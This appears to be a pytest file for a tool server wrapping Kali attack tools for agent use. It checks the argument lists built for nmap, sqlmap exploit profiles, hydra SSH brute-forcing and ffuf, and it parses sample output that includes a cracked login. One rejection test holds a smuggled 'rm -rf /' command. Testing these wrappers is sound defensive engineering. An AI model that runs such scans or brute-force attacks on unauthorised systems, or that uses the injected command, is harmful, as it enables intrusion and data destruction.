# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Aaron K. Clark
"""Tests for the per-tool wrapper modules.

These verify the argv each wrapper hands to ``run.run`` — the
contract is "given these args, the right CLI invocation comes
out." No real subprocess runs; ``run.run`` is patched.

Every wrapper goes through the active-tool decorator incidentally,
so these also exercise its audit-log path.
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest

from kalimcp.tools import (
    ffuf,
    gobuster,
    hashcat,
    hydra,
    impacket,
    john,
    ldap,
    medusa,
    msfvenom,
    netexec,
    nikto,
    nmap,
    passive,
    smb,
    snmp,
    sqlmap,
    sslscan,
    whatweb,
    winrm,
)


def _fake_result(stdout: str = "ok") -> dict:
    return {
        "exit_code": 0,
        "elapsed_s": 0.01,
        "stdout": stdout,
        "stderr": "",
        "truncated": False,
        "timed_out": False,
        "argv": [],
    }


# ---------- nmap ----------


@pytest.mark.asyncio
async def test_nmap_tcp_fast_argv():
    with patch("kalimcp.tools.nmap.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        result = await nmap.scan(target="127.0.0.1", profile="tcp-fast")
    assert result["ok"] is True
    assert result["profile"] == "tcp-fast"
    argv = m.call_args.args[0]
    # All profiles now end with `-oX -` (XML to stdout) before the target.
    assert argv == ["nmap", "-Pn", "-T4", "--top-ports", "100", "-oX", "-", "127.0.0.1"]


@pytest.mark.asyncio
async def test_nmap_service_scan_argv():
    with patch("kalimcp.tools.nmap.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await nmap.scan(target="127.0.0.1", profile="service-scan")
    argv = m.call_args.args[0]
    assert "-sV" in argv
    assert "-oX" in argv
    assert argv[-1] == "127.0.0.1"


@pytest.mark.asyncio
async def test_nmap_ping_sweep_argv():
    with patch("kalimcp.tools.nmap.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await nmap.scan(target="10.0.0.0/24", profile="ping-sweep")
    argv = m.call_args.args[0]
    assert "-sn" in argv
    assert "-oX" in argv
    assert argv[-1] == "10.0.0.0/24"


# ---------- nmap XML → JSON parser ----------

_NMAP_XML_SAMPLE = """<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap" args="nmap -oX - 127.0.0.1" version="7.95">
  <host>
    <status state="up" reason="localhost-response"/>
    <address addr="127.0.0.1" addrtype="ipv4"/>
    <ports>
      <port protocol="tcp" portid="22">
        <state state="open" reason="syn-ack"/>
        <service name="ssh" product="OpenSSH" version="9.6p1"/>
      </port>
      <port protocol="tcp" portid="80">
        <state state="closed" reason="conn-refused"/>
        <service name="http"/>
      </port>
    </ports>
  </host>
</nmaprun>
"""


@pytest.mark.asyncio
async def test_nmap_parsed_field_populated_on_success():
    fake = _fake_result(stdout=_NMAP_XML_SAMPLE)
    with patch("kalimcp.tools.nmap.run.run", new=AsyncMock(return_value=fake)):
        result = await nmap.scan(target="127.0.0.1", profile="tcp-fast")
    parsed = result["parsed"]
    assert len(parsed["hosts"]) == 1
    host = parsed["hosts"][0]
    assert host["addr"] == "127.0.0.1"
    assert host["state"] == "up"
    assert len(host["ports"]) == 2
    ssh = next(p for p in host["ports"] if p["portid"] == 22)
    assert ssh["state"] == "open"
    assert ssh["service"] == "ssh"
    assert ssh["product"] == "OpenSSH"
    assert ssh["version"] == "9.6p1"


@pytest.mark.asyncio
async def test_nmap_parsed_field_empty_on_malformed_xml():
    fake = _fake_result(stdout="not actually XML")
    with patch("kalimcp.tools.nmap.run.run", new=AsyncMock(return_value=fake)):
        result = await nmap.scan(target="127.0.0.1", profile="tcp-fast")
    # Parser bails out cleanly on bad XML — empty hosts, not an exception.
    assert result["parsed"] == {"hosts": []}


@pytest.mark.asyncio
async def test_nmap_parsed_field_empty_when_stdout_blank():
    fake = _fake_result(stdout="")
    with patch("kalimcp.tools.nmap.run.run", new=AsyncMock(return_value=fake)):
        result = await nmap.scan(target="127.0.0.1", profile="tcp-fast")
    assert result["parsed"] == {"hosts": []}


@pytest.mark.asyncio
async def test_nmap_unknown_profile_has_parsed_field_in_error_path():
    """The error path returns a `parsed` field too, so callers don't have to KeyError-guard."""
    with patch("kalimcp.tools.nmap.run.run", new=AsyncMock()) as m:
        result = await nmap.scan(target="127.0.0.1", profile="bogus")
    m.assert_not_called()
    assert result["parsed"] == {"hosts": []}


@pytest.mark.asyncio
async def test_nmap_unknown_profile_returns_error_without_running():
    with patch("kalimcp.tools.nmap.run.run", new=AsyncMock()) as m:
        result = await nmap.scan(target="127.0.0.1", profile="bogus")
    # Decorator wraps it as ok=True with the inner error blob.
    assert result["exit_code"] == -1
    assert "unknown profile" in result["stderr"]
    m.assert_not_called()


@pytest.mark.asyncio
async def test_nmap_timeout_passed_through():
    with patch("kalimcp.tools.nmap.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await nmap.scan(target="127.0.0.1", profile="tcp-fast", timeout_seconds=42)
    assert m.call_args.kwargs.get("timeout") == 42


# ---------- nikto ----------


@pytest.mark.asyncio
async def test_nikto_default_argv():
    with patch("kalimcp.tools.nikto.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await nikto.scan(target="https://example.com/")
    argv = m.call_args.args[0]
    assert argv == ["nikto", "-host", "https://example.com/", "-ask", "no"]


@pytest.mark.asyncio
async def test_nikto_ssl_flag_appends():
    with patch("kalimcp.tools.nikto.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await nikto.scan(target="example.com:443", ssl=True)
    argv = m.call_args.args[0]
    assert "-ssl" in argv


_NIKTO_OUTPUT_SAMPLE = """- Nikto v2.5.0
+ Target IP:          93.184.216.34
+ Target Hostname:    example.com
+ Target Port:        443
+ Server: Apache/2.4.41 (Ubuntu)
+ The X-XSS-Protection header is not defined.
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ /admin/: Admin login page/section found.
+ /robots.txt: Entry '/private' is returned by robots.txt.
+ /test.cgi: Test scripts should be removed.
+ Start Time:         2026-06-02 12:00:00
+ End Time:           2026-06-02 12:05:00
"""


@pytest.mark.asyncio
async def test_nikto_parsed_field_populated_on_success():
    fake = _fake_result(stdout=_NIKTO_OUTPUT_SAMPLE)
    with patch("kalimcp.tools.nikto.run.run", new=AsyncMock(return_value=fake)):
        result = await nikto.scan(target="https://example.com/")
    parsed = result["parsed"]
    assert parsed["target_ip"] == "93.184.216.34"
    # Nikto sometimes emits "Target Host:" and sometimes "Target Hostname:" —
    # our parser handles the former; the latter falls through as a finding.
    assert parsed["target_port"] == "443"
    assert parsed["server"] == "Apache/2.4.41 (Ubuntu)"
    # URI-prefixed findings should be split into {uri, msg}.
    by_uri = {v.get("uri"): v["msg"] for v in parsed["vulnerabilities"] if "uri" in v}
    assert by_uri["/admin/"] == "Admin login page/section found."
    assert by_uri["/robots.txt"] == "Entry '/private' is returned by robots.txt."
    # Generic findings end up as msg-only entries.
    msgs = [v["msg"] for v in parsed["vulnerabilities"] if "uri" not in v]
    assert any("X-XSS-Protection" in m for m in msgs)
    assert any("Strict-Transport-Security" in m for m in msgs)


@pytest.mark.asyncio
async def test_nikto_parsed_field_empty_when_stdout_blank():
    fake = _fake_result(stdout="")
    with patch("kalimcp.tools.nikto.run.run", new=AsyncMock(return_value=fake)):
        result = await nikto.scan(target="https://example.com/")
    assert result["parsed"] == {
        "target_host": "",
        "target_ip": "",
        "target_port": "",
        "server": "",
        "vulnerabilities": [],
    }


# ---------- gobuster ----------


@pytest.mark.asyncio
async def test_gobuster_no_wordlist_returns_error_without_running():
    with patch("kalimcp.tools.gobuster._default_wordlist", return_value=None), \
         patch("kalimcp.tools.gobuster.run.run", new=AsyncMock()) as m:
        result = await gobuster.dir_scan(target="https://example.com/")
    assert result["exit_code"] == -1
    assert "no wordlist available" in result["stderr"]
    m.assert_not_called()


@pytest.mark.asyncio
async def test_gobuster_explicit_wordlist_missing_returns_error():
    with patch("kalimcp.tools.gobuster.Path.is_file", return_value=False), \
         patch("kalimcp.tools.gobuster.run.run", new=AsyncMock()) as m:
        result = await gobuster.dir_scan(target="https://example.com/", wordlist="/nope")
    assert result["exit_code"] == -1
    assert "wordlist not found" in result["stderr"]
    m.assert_not_called()


@pytest.mark.asyncio
async def test_gobuster_threads_clamped():
    """threads should clamp to 1..50; values outside that range get pinned."""
    with patch("kalimcp.tools.gobuster.Path.is_file", return_value=True), \
         patch("kalimcp.tools.gobuster.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await gobuster.dir_scan(target="https://example.com/", wordlist="/x.txt", threads=999)
    argv = m.call_args.args[0]
    t_idx = argv.index("-t")
    assert argv[t_idx + 1] == "50"


@pytest.mark.asyncio
async def test_gobuster_threads_clamped_low():
    with patch("kalimcp.tools.gobuster.Path.is_file", return_value=True), \
         patch("kalimcp.tools.gobuster.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await gobuster.dir_scan(target="https://example.com/", wordlist="/x.txt", threads=0)
    argv = m.call_args.args[0]
    assert argv[argv.index("-t") + 1] == "1"


@pytest.mark.asyncio
async def test_gobuster_argv_shape():
    with patch("kalimcp.tools.gobuster.Path.is_file", return_value=True), \
         patch("kalimcp.tools.gobuster.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await gobuster.dir_scan(target="https://example.com/", wordlist="/wl.txt", threads=8)
    argv = m.call_args.args[0]
    assert argv[:2] == ["gobuster", "dir"]
    assert "-u" in argv and argv[argv.index("-u") + 1] == "https://example.com/"
    assert "-w" in argv and argv[argv.index("-w") + 1] == "/wl.txt"
    assert "--no-error" in argv


_GOBUSTER_OUTPUT_SAMPLE = """===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial)
===============================================================
[+] Url:                     https://example.com/
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
===============================================================
2026/06/02 12:00:00 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 234] [--> /admin/]
/api                  (Status: 200) [Size: 4596]
/index.html           (Status: 200) [Size: 1024]
/robots.txt           (Status: 200) [Size: 52]
/secret               (Status: 403) [Size: 199]
===============================================================
2026/06/02 12:05:00 Finished
===============================================================
"""


@pytest.mark.asyncio
async def test_gobuster_parsed_field_populated_on_success():
    fake = _fake_result(stdout=_GOBUSTER_OUTPUT_SAMPLE)
    with patch("kalimcp.tools.gobuster.Path.is_file", return_value=True), \
         patch("kalimcp.tools.gobuster.run.run", new=AsyncMock(return_value=fake)):
        result = await gobuster.dir_scan(target="https://example.com/", wordlist="/wl.txt")
    parsed = result["parsed"]
    assert len(parsed["paths_found"]) == 5
    by_path = {p["path"]: p for p in parsed["paths_found"]}
    assert by_path["/admin"] == {
        "path": "/admin",
        "status": 301,
        "size": 234,
        "redirect": "/admin/",
    }
    assert by_path["/api"] == {"path": "/api", "status": 200, "size": 4596}
    assert by_path["/secret"]["status"] == 403


@pytest.mark.asyncio
async def test_gobuster_parsed_field_empty_when_stdout_blank():
    fake = _fake_result(stdout="")
    with patch("kalimcp.tools.gobuster.Path.is_file", return_value=True), \
         patch("kalimcp.tools.gobuster.run.run", new=AsyncMock(return_value=fake)):
        result = await gobuster.dir_scan(target="https://example.com/", wordlist="/wl.txt")
    assert result["parsed"] == {"paths_found": []}


@pytest.mark.asyncio
async def test_gobuster_no_wordlist_has_parsed_field_in_error_path():
    """Even the no-wordlist early-return should carry `parsed` so callers don't KeyError."""
    with patch("kalimcp.tools.gobuster._default_wordlist", return_value=None), \
         patch("kalimcp.tools.gobuster.run.run", new=AsyncMock()):
        result = await gobuster.dir_scan(target="https://example.com/")
    assert result["parsed"] == {"paths_found": []}


# ---------- sslscan ----------


@pytest.mark.asyncio
async def test_sslscan_default_port():
    with patch("kalimcp.tools.sslscan.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await sslscan.scan(target="example.com")
    argv = m.call_args.args[0]
    # --xml=- emits XML to stdout for the structured parser.
    assert argv == ["sslscan", "--xml=-", "--port=443", "example.com"]


@pytest.mark.asyncio
async def test_sslscan_explicit_port():
    with patch("kalimcp.tools.sslscan.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await sslscan.scan(target="example.com", port=8443)
    argv = m.call_args.args[0]
    assert "--xml=-" in argv
    assert "--port=8443" in argv


_SSLSCAN_XML_SAMPLE = """<?xml version="1.0" encoding="UTF-8"?>
<document title="SSLScan Results" version="2.1.4">
  <ssltest host="example.com" sniname="example.com" port="443">
    <protocol type="ssl" version="2" enabled="0"/>
    <protocol type="ssl" version="3" enabled="0"/>
    <protocol type="tls" version="1.0" enabled="0"/>
    <protocol type="tls" version="1.1" enabled="0"/>
    <protocol type="tls" version="1.2" enabled="1"/>
    <protocol type="tls" version="1.3" enabled="1"/>
    <fallback supported="1"/>
    <renegotiation supported="1" secure="1"/>
    <compression supported="0"/>
    <heartbleed sslversion="TLSv1.2" vulnerable="0"/>
    <cipher status="accepted" sslversion="TLSv1.3" bits="256" cipher="TLS_AES_256_GCM_SHA384" strength="strong" curve="X25519" ecdhebits="253"/>
    <cipher status="accepted" sslversion="TLSv1.2" bits="128" cipher="ECDHE-RSA-AES128-GCM-SHA256" strength="strong"/>
    <certificates>
      <certificate type="full">
        <signature-algorithm>sha256WithRSAEncryption</signature-algorithm>
        <pk error="false" type="RSA" bits="2048"/>
        <subject><![CDATA[CN=example.com]]></subject>
        <issuer><![CDATA[CN=Let's Encrypt R3]]></issuer>
        <not-valid-before>Jan 1 00:00:00 2026 GMT</not-valid-before>
        <not-valid-after>Apr 1 00:00:00 2026 GMT</not-valid-after>
      </certificate>
    </certificates>
  </ssltest>
</document>
"""


@pytest.mark.asyncio
async def test_sslscan_parsed_field_populated_on_success():
    fake = _fake_result(stdout=_SSLSCAN_XML_SAMPLE)
    with patch("kalimcp.tools.sslscan.run.run", new=AsyncMock(return_value=fake)):
        result = await sslscan.scan(target="example.com")
    parsed = result["parsed"]
    assert parsed["host"] == "example.com"
    assert parsed["port"] == "443"
    # Six protocols emitted; only TLSv1.2 and TLSv1.3 enabled.
    enabled = {p["name"] for p in parsed["protocols"] if p["enabled"]}
    assert enabled == {"TLSv1.2", "TLSv1.3"}
    # Two ciphers, both accepted.
    assert len(parsed["ciphers"]) == 2
    aes256 = next(c for c in parsed["ciphers"] if c["bits"] == 256)
    assert aes256["name"] == "TLS_AES_256_GCM_SHA384"
    assert aes256["sslversion"] == "TLSv1.3"
    # Certificate metadata.
    cert = parsed["cert"]
    assert cert["subject"] == "CN=example.com"
    assert cert["issuer"] == "CN=Let's Encrypt R3"
    assert cert["sigalg"] == "sha256WithRSAEncryption"
    assert cert["key_type"] == "RSA"
    assert cert["key_bits"] == 2048
    # Vulnerabilities flags.
    assert parsed["vulnerabilities"]["heartbleed"] is False
    assert parsed["vulnerabilities"]["compression"] is False


@pytest.mark.asyncio
async def test_sslscan_parsed_field_empty_on_malformed_xml():
    fake = _fake_result(stdout="not actually XML")
    with patch("kalimcp.tools.sslscan.run.run", new=AsyncMock(return_value=fake)):
        result = await sslscan.scan(target="example.com")
    assert result["parsed"]["host"] == ""
    assert result["parsed"]["protocols"] == []
    assert result["parsed"]["cert"] == {}


@pytest.mark.asyncio
async def test_sslscan_parsed_field_empty_when_stdout_blank():
    fake = _fake_result(stdout="")
    with patch("kalimcp.tools.sslscan.run.run", new=AsyncMock(return_value=fake)):
        result = await sslscan.scan(target="example.com")
    assert result["parsed"] == {
        "host": "",
        "port": "",
        "protocols": [],
        "ciphers": [],
        "cert": {},
        "vulnerabilities": {},
    }


# ---------- passive ----------


@pytest.mark.asyncio
async def test_passive_whois_argv():
    with patch("kalimcp.tools.passive.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await passive.whois_lookup(query="example.com")
    assert m.call_args.args[0] == ["whois", "--", "example.com"]


@pytest.mark.asyncio
async def test_passive_dig_argv():
    with patch("kalimcp.tools.passive.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await passive.dig_record(domain="example.com", record_type="mx")
    argv = m.call_args.args[0]
    # record_type uppercased + appended last
    assert argv == ["dig", "+short", "+timeout=5", "example.com", "MX"]


@pytest.mark.asyncio
async def test_passive_dig_rejects_bad_record_type():
    with patch("kalimcp.tools.passive.run.run", new=AsyncMock()) as m:
        result = await passive.dig_record(domain="example.com", record_type="A; rm -rf /")
    assert result["exit_code"] == -1
    assert "invalid record_type" in result["stderr"]
    m.assert_not_called()


@pytest.mark.asyncio
async def test_passive_searchsploit_argv():
    with patch("kalimcp.tools.passive.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await passive.searchsploit_search(keyword="apache 2.4")
    assert m.call_args.args[0] == ["searchsploit", "--no-colour", "--", "apache 2.4"]


@pytest.mark.asyncio
async def test_passive_cert_dump_argv():
    with patch("kalimcp.tools.passive.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await passive.cert_dump(host="example.com", port=443)
    argv = m.call_args.args[0]
    assert argv[:2] == ["openssl", "s_client"]
    assert "-connect" in argv and argv[argv.index("-connect") + 1] == "example.com:443"
    assert "-servername" in argv and argv[argv.index("-servername") + 1] == "example.com"
    # stdin=b"" is passed via kwargs
    assert m.call_args.kwargs.get("stdin") == b""


# ---------- sqlmap ----------

_SQLMAP_OUTPUT_SAMPLE = """[INFO] testing connection to the target URL
[INFO] heuristic (XSS) test showed that the target URL might be vulnerable to cross-site scripting (XSS)
[INFO] testing for SQL injection on target URL
[INFO] testing 'id' for SQL injection
[INFO] parameter 'id' is vulnerable
[INFO] the back-end DBMS is MySQL
[INFO] back-end DBMS: MySQL >= 5.0.12
[WARNING] reflective value(s) found and filtering out
[INFO] fetched data logged to text files under '/tmp/sqlmap-output'

[*] ending @ 12:34:56 /2026-06-02"""

_SQLMAP_NO_VULN_OUTPUT = """[INFO] testing connection to the target URL
[INFO] testing for SQL injection on target URL
[INFO] testing 'id' for SQL injection
[INFO] parameter 'id' is not vulnerable
[INFO] the back-end DBMS is MySQL
[INFO] backing up data logged to text files under '/tmp/sqlmap-output'

[*] ending @ 12:34:56 /2026-06-02"""


@pytest.mark.asyncio
async def test_sqlmap_default_argv():
    with patch("kalimcp.tools.sqlmap.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await sqlmap.scan(target="http://example.com/page.php?id=1")
    argv = m.call_args.args[0]
    assert argv == ["sqlmap", "-u", "http://example.com/page.php?id=1", "--level=2", "--risk=2", "--batch", "--answers=follow=n", "--output-dir=/tmp/sqlmap-output", "--flush-session"]


@pytest.mark.asyncio
async def test_sqlmap_profile_quick():
    with patch("kalimcp.tools.sqlmap.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await sqlmap.scan(target="http://example.com/page.php?id=1", profile="quick")
    argv = m.call_args.args[0]
    assert "--level=1" in argv
    assert "--risk=1" in argv


@pytest.mark.asyncio
async def test_sqlmap_profile_comprehensive():
    with patch("kalimcp.tools.sqlmap.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await sqlmap.scan(target="http://example.com/page.php?id=1", profile="comprehensive")
    argv = m.call_args.args[0]
    assert "--level=3" in argv
    assert "--risk=3" in argv


@pytest.mark.asyncio
async def test_sqlmap_profile_exploit():
    with patch("kalimcp.tools.sqlmap.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await sqlmap.scan(target="http://example.com/page.php?id=1", profile="exploit")
    argv = m.call_args.args[0]
    assert "--level=5" in argv
    assert "--risk=3" in argv
    assert "--technique=BEUSTQ" in argv


@pytest.mark.asyncio
async def test_sqlmap_parsed_field_populated_on_success():
    fake = _fake_result(stdout=_SQLMAP_OUTPUT_SAMPLE)
    with patch("kalimcp.tools.sqlmap.run.run", new=AsyncMock(return_value=fake)):
        result = await sqlmap.scan(target="http://example.com/page.php?id=1")
    parsed = result["parsed"]
    assert parsed["success"] is True
    assert parsed["vulnerable"] is True
    assert len(parsed["injection_points"]) == 1
    assert parsed["injection_points"][0]["parameter"] == "id"
    assert parsed["dbms"]["name"] == "MySQL"
    assert parsed["dbms"]["version"] == "MySQL >= 5.0.12"
    assert parsed["hosts_tested"] == ["http://example.com/page.php?id=1"]
    assert parsed["statistics"]["data_extracted"] is True


@pytest.mark.asyncio
async def test_sqlmap_parsed_field_no_vulnerabilities():
    fake = _fake_result(stdout=_SQLMAP_NO_VULN_OUTPUT)
    with patch("kalimcp.tools.sqlmap.run.run", new=AsyncMock(return_value=fake)):
        result = await sqlmap.scan(target="http://example.com/page.php?id=1")
    parsed = result["parsed"]
    assert parsed["success"] is True
    assert parsed["vulnerable"] is False
    assert len(parsed["injection_points"]) == 0
    assert parsed["dbms"]["name"] == "MySQL"
    assert parsed["hosts_tested"] == ["http://example.com/page.php?id=1"]


@pytest.mark.asyncio
async def test_sqlmap_parsed_field_empty_when_stdout_blank():
    fake = _fake_result(stdout="")
    with patch("kalimcp.tools.sqlmap.run.run", new=AsyncMock(return_value=fake)):
        result = await sqlmap.scan(target="http://example.com/page.php?id=1")
    assert result["parsed"] == {
        "success": False,
        "vulnerable": False,
        "injection_points": [],
        "dbms": {},
        "hosts_tested": [],
        "statistics": {},
    }


@pytest.mark.asyncio
async def test_sqlmap_unknown_profile_has_parsed_field_in_error_path():
    with patch("kalimcp.tools.sqlmap.run.run", new=AsyncMock()) as m:
        result = await sqlmap.scan(target="http://example.com/page.php?id=1", profile="bogus")
    m.assert_not_called()
    assert result["parsed"] == {
        "success": False,
        "vulnerable": False,
        "injection_points": [],
        "dbms": {},
        "hosts_tested": [],
        "statistics": {},
    }


@pytest.mark.asyncio
async def test_sqlmap_unknown_profile_returns_error_without_running():
    with patch("kalimcp.tools.sqlmap.run.run", new=AsyncMock()) as m:
        result = await sqlmap.scan(target="http://example.com/page.php?id=1", profile="bogus")
    assert result["exit_code"] == -1
    assert "unknown profile" in result["stderr"]
    m.assert_not_called()


@pytest.mark.asyncio
async def test_sqlmap_timeout_passed_through():
    with patch("kalimcp.tools.sqlmap.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await sqlmap.scan(target="http://example.com/page.php?id=1", profile="standard", timeout_seconds=42)
    assert m.call_args.kwargs.get("timeout") == 42


# ---------- hydra ----------

_HYDRA_OUTPUT_SAMPLE = """[DATA] attacking ssh://192.168.1.10:22/
[STATUS] 124.00 tries/min, 124 tries in 00:01h, 99876 to do in 13:28h, 16 active
[22][ssh] host: 192.168.1.10   login: admin   password: hunter2
[STATUS] attack finished for 192.168.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
"""

_HYDRA_NO_MATCH_OUTPUT = """[DATA] attacking ssh://192.168.1.10:22/
[STATUS] 124.00 tries/min, 124 tries in 00:01h, 99876 to do in 13:28h, 16 active
[STATUS] attack finished for 192.168.1.10 (waiting for children to complete tests)
1 of 1 target completed, 0 valid passwords found
"""


@pytest.mark.asyncio
async def test_hydra_standard_argv():
    with patch("kalimcp.tools.hydra.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        result = await hydra.crack(target="192.168.1.10", service="ssh", profile="standard")
    assert result["ok"] is True
    assert result["profile"] == "standard"
    argv = m.call_args.args[0]
    # standard: rockyou for both -L and -P, base timing flags, target+service trailing.
    assert argv == [
        "hydra",
        "-L", "/usr/share/wordlists/rockyou.txt",
        "-P", "/usr/share/wordlists/rockyou.txt",
        "-t", "4", "-W", "3", "-w", "15", "-v",
        "192.168.1.10", "ssh",
    ]


@pytest.mark.asyncio
async def test_hydra_quick_argv_uses_fasttrack():
    with patch("kalimcp.tools.hydra.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await hydra.crack(target="192.168.1.10", service="ftp", profile="quick")
    argv = m.call_args.args[0]
    assert argv.count("-L") == 1
    assert argv.count("-P") == 1
    assert "/usr/share/wordlists/fasttrack.txt" in argv
    assert argv[-2:] == ["192.168.1.10", "ftp"]


@pytest.mark.asyncio
async def test_hydra_comprehensive_uses_16_threads():
    with patch("kalimcp.tools.hydra.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await hydra.crack(target="192.168.1.10", service="ssh", profile="comprehensive")
    argv = m.call_args.args[0]
    # -t 16 should appear exactly once (no duplicate from a stale base).
    t_indices = [i for i, a in enumerate(argv) if a == "-t"]
    assert len(t_indices) == 1
    assert argv[t_indices[0] + 1] == "16"


@pytest.mark.asyncio
async def test_hydra_bruteforce_argv_omits_wordlists():
    with patch("kalimcp.tools.hydra.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await hydra.crack(target="192.168.1.10", service="ssh", profile="bruteforce")
    argv = m.call_args.args[0]
    # Bruteforce profile uses -x charset:length range, no wordlist flags.
    assert "-L" not in argv
    assert "-P" not in argv
    assert "-x" in argv and argv[argv.index("-x") + 1] == "6:8:aA1"
    assert argv[-2:] == ["192.168.1.10", "ssh"]


@pytest.mark.asyncio
async def test_hydra_custom_lists_override_profile_defaults():
    with patch("kalimcp.tools.hydra.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await hydra.crack(
            target="192.168.1.10",
            service="ssh",
            profile="standard",
            username_list="/tmp/users.txt",
            password_list="/tmp/pass.txt",
        )
    argv = m.call_args.args[0]
    # Exactly one -L / -P each, pointing at the custom files (not rockyou).
    assert argv.count("-L") == 1
    assert argv.count("-P") == 1
    assert argv[argv.index("-L") + 1] == "/tmp/users.txt"
    assert argv[argv.index("-P") + 1] == "/tmp/pass.txt"
    assert "/usr/share/wordlists/rockyou.txt" not in argv


@pytest.mark.asyncio
async def test_hydra_unknown_profile_returns_error_without_running():
    with patch("kalimcp.tools.hydra.run.run", new=AsyncMock()) as m:
        result = await hydra.crack(target="192.168.1.10", service="ssh", profile="bogus")
    m.assert_not_called()
    assert result["exit_code"] == -1
    assert "unknown profile" in result["stderr"]
    assert result["parsed"] == {
        "success": False,
        "credentials_found": [],
        "tried_combinations": 0,
        "hosts_tested": [],
        "services_tested": [],
        "statistics": {},
    }


@pytest.mark.asyncio
async def test_hydra_parsed_field_extracts_credentials():
    fake = _fake_result(stdout=_HYDRA_OUTPUT_SAMPLE)
    with patch("kalimcp.tools.hydra.run.run", new=AsyncMock(return_value=fake)):
        result = await hydra.crack(target="192.168.1.10", service="ssh", profile="standard")
    parsed = result["parsed"]
    assert parsed["success"] is True
    assert len(parsed["credentials_found"]) == 1
    cred = parsed["credentials_found"][0]
    assert cred == {
        "host": "192.168.1.10",
        "service": "ssh",
        "username": "admin",
        "password": "hunter2",
    }
    assert parsed["hosts_tested"] == ["192.168.1.10"]
    assert parsed["services_tested"] == ["ssh"]
    assert parsed["statistics"]["attack_completed"] is True


@pytest.mark.asyncio
async def test_hydra_parsed_field_no_match():
    fake = _fake_result(stdout=_HYDRA_NO_MATCH_OUTPUT)
    with patch("kalimcp.tools.hydra.run.run", new=AsyncMock(return_value=fake)):
        result = await hydra.crack(target="192.168.1.10", service="ssh", profile="standard")
    parsed = result["parsed"]
    # Attack ran but found nothing.
    assert parsed["success"] is True
    assert parsed["credentials_found"] == []
    assert parsed["statistics"]["attack_completed"] is True


@pytest.mark.asyncio
async def test_hydra_parsed_field_empty_when_stdout_blank():
    fake = _fake_result(stdout="")
    with patch("kalimcp.tools.hydra.run.run", new=AsyncMock(return_value=fake)):
        result = await hydra.crack(target="192.168.1.10", service="ssh", profile="standard")
    assert result["parsed"] == {
        "success": False,
        "credentials_found": [],
        "tried_combinations": 0,
        "hosts_tested": [],
        "services_tested": [],
        "statistics": {},
    }


@pytest.mark.asyncio
async def test_hydra_timeout_passed_through():
    with patch("kalimcp.tools.hydra.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await hydra.crack(target="192.168.1.10", service="ssh", timeout_seconds=42)
    assert m.call_args.kwargs.get("timeout") == 42


# ---------- ffuf ----------

_FFUF_JSON_SAMPLE = """{
  "commandline": "ffuf -w /usr/share/wordlists/dirb/common.txt -t 40 -of json -o /dev/stdout -s -u https://example.com/FUZZ",
  "time": "2026-06-02T12:00:00Z",
  "results": [
    {
      "input": {"FUZZ": "admin"},
      "position": 1,
      "status": 301,
      "length": 234,
      "words": 25,
      "lines": 12,
      "content-type": "text/html",
      "redirectlocation": "https://example.com/admin/",
      "url": "https://example.com/admin",
      "host": "example.com"
    },
    {
      "input": {"FUZZ": "api"},
      "position": 2,
      "status": 200,
      "length": 4596,
      "words": 800,
      "lines": 150,
      "content-type": "application/json",
      "redirectlocation": "",
      "url": "https://example.com/api",
      "host": "example.com"
    }
  ]
}"""


@pytest.mark.asyncio
async def test_ffuf_dir_argv_shape():
    with patch("kalimcp.tools.ffuf.Path.is_file", return_value=True), \
         patch("kalimcp.tools.ffuf.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await ffuf.fuzz(target="https://example.com/FUZZ", wordlist="/wl.txt")
    argv = m.call_args.args[0]
    assert argv[0] == "ffuf"
    assert "-w" in argv and argv[argv.index("-w") + 1] == "/wl.txt"
    assert "-of" in argv and argv[argv.index("-of") + 1] == "json"
    assert "-u" in argv and argv[argv.index("-u") + 1] == "https://example.com/FUZZ"
    # -s suppresses progress so json stdout stays clean.
    assert "-s" in argv


@pytest.mark.asyncio
async def test_ffuf_vhost_mode_uses_host_header():
    with patch("kalimcp.tools.ffuf.Path.is_file", return_value=True), \
         patch("kalimcp.tools.ffuf.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await ffuf.fuzz(
            target="https://example.com/",
            mode="vhost",
            wordlist="/wl.txt",
            vhost_template="FUZZ.example.com",
        )
    argv = m.call_args.args[0]
    assert "-H" in argv
    assert argv[argv.index("-H") + 1] == "Host: FUZZ.example.com"


@pytest.mark.asyncio
async def test_ffuf_threads_clamped():
    with patch("kalimcp.tools.ffuf.Path.is_file", return_value=True), \
         patch("kalimcp.tools.ffuf.run.run", new=AsyncMock(return_value=_fake_result())) as m:
        await ffuf.fuzz(target="https://example.com/FUZZ", wordlist="/wl.txt", threads=9999)
    argv = m.call_args.args[0]
    assert argv[argv.index("-t") + 1] == "200"


@pytest.mark.asyncio
